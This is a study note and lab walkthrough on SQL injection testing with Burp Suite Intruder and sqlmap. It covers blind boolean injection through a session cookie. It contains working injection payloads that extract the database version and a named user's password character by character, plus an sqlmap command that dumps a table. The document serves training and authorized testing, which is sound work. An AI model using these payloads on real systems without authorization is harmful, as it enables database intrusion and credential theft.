## üéØ Tools and Techniques

### üîç Intruder Sniper in Burp Suite

#### What is Intruder Sniper in Burp?

- **Definition:**  
  A tool in Burp Suite primarily used for tasks like:
  - Brute forcing login forms and session tokens.
  - Parameter manipulation.
  - Testing for SQL injections and other vulnerabilities.

## üõ†Ô∏è sqlmap Detailed Usage

### Understanding sqlmap Commands and Flags

#### Command: `sqlmap -r req-slqi2.txt --level=2`
- **Flag: `-level=2`**
  - **Explanation:**  
    Specifies the depth of testing, with levels ranging from 1 to 5 (default is 1).  
    Level 2 enables more comprehensive tests, increasing thoroughness and vulnerability detection.

---

#### Command: `sqlmap -r req-slqi2.txt --level=2 --dump -T injection0x02`
- **Flag: `T`**
  - **Explanation:**  
    Focuses on a specific table in the database (`injection0x02`), targeting it for data extraction.

### Interaction and Prompts in sqlmap

1. **Prompt:**  
   _"Do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]?"_
   - **Meaning:**  
     Save discovered password hashes for later use with other tools.
   - **Answer Choice:** `n` (no) - Opt not to save hashes during this session.

2. **Prompt:**  
   _"Do you want to crack them via a dictionary-based attack? [Y/n/q]?"_
   - **Meaning:**  
     Attempts to crack the hashes using a dictionary attack.
   - **Answer Choice:** `n` (no) - Decline to perform cracking at this stage.

3. **Prompt:**  
   _"Do you want to URL encode cookie values (implementation specific)? [Y/n]"_
   - **Meaning:**  
     URL encode cookie values if necessary for HTTP transmission.
   - **Answer Choice:** `n` (no) - Skip URL encoding.

## üîç Lab Solution: Detecting SQL Injection in Cookies

### 1Ô∏è‚É£ **Investigating Application Behavior**
- Monitor all GET requests in Burp Suite Proxy.
- Test for SQL injection in cookies, as manual injection and fuzzing failed elsewhere.

---

### 2Ô∏è‚É£ **Analyzing Cookie Behavior**
- Example Cookie:  
  ```
  Cookie: session=6967cabefd763ac...57db
  ```
- **Baseline Test:**  
  - Send an invalid cookie to observe response differences.
  - Valid cookie response: `Content-Length = 1027`.  
  - Invalid cookie response: `Content-Length = 1928`.  
- **SQL Injection Test:**  
  ```
  Cookie: session=6967cabefd763ac...57db' and 1=1#
  ```
  - Response: `Content-Length = 1027` (accepted).  
    This confirms the cookie is vulnerable.

---

### 3Ô∏è‚É£ **Extracting Information**
- Use conditional SQL queries to retrieve data step by step:
  - Example:  
    ```
    Cookie: session=6967cabefd763ac...57db' and substring((select version()), 1, 5) = '8.0'#
    ```
  - Gradually reveal version details:  
    ```
    8.0.3
    ```

---

### 4Ô∏è‚É£ **Fuzzing with Burp Suite Intruder**
- Automate the process using Intruder:
  ```
  Cookie: session=6967cabefd763ac...57db' and substring((select password from injection0x02 where username='jessamy'), 1, 1) = 'b'#
  ```
- Use a payload of all possible characters to find matches based on response differences.

---

### 5Ô∏è‚É£ **Using sqlmap for Automation**
- Command:
  ```bash
  sqlmap -r req-slqi2.txt --level=2 --dump -T injection0x02
  ```
- Automates the detection and extraction process, revealing the vulnerable cookie and data.

## üîÑ Best Practices for Ethical Testing

- **Stay Within Limits:**  
  Avoid exceeding bug bounty limits (e.g., 5 requests/second).
- **Use Legal and Ethical Tools:**  
  Only test applications you have explicit authorization for.
- **Automate Wisely:**  
  Use tools like sqlmap judiciously to minimize unnecessary requests.

This deep dive demonstrates the power of both manual and automated SQL injection testing, emphasizing the importance of ethical and efficient practices.
